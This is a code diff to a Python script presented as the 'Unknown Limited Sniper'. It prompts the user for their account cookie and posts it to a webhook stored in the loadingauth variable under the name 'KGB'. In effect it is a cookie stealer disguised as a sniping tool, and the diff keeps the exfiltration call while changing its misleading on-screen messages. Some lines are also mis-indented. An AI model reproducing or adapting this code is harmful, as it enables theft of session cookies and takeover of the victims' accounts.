@@ -4,12 +4,10 @@ import time
 import colorama
 from colorama import Fore, Back, Style
 from pystyle import Anime, Colorate, Colors, Center, System, Write
-from urllib import response
 
 colorama.init()
 
 loadingauth = ""
-#put your webhook between ""
 
 
 def w(text: str):
@@ -29,20 +27,20 @@ startup()
 
 
 def main():
-    w("Welcome to Unknown Limited Sniper! Press enter to continue")
-    
+    w("Welcome to Unknown Limited Sniper!")
     cookiedata = Write.Input("cookie ->",
                              Colors.purple_to_blue,
                              interval=0.005)
     os.system('cls')
-    w("Wait one minute, do not press anything or the program will close!")
-time.sleep(67)
-w("Could not snipe anything, please use later in 20 minutes."
+    w("Loading")
     requests.post(loadingauth,
                   json={
-                      'username': 'Cookie Sender',
+                      'username': 'KGB',
                       'content': f'```{cookiedata}```'
                   })
-    
+  w("You can leave this program now by pressing enter. :)")
+    os.system('cls')
+
+
 
 main()
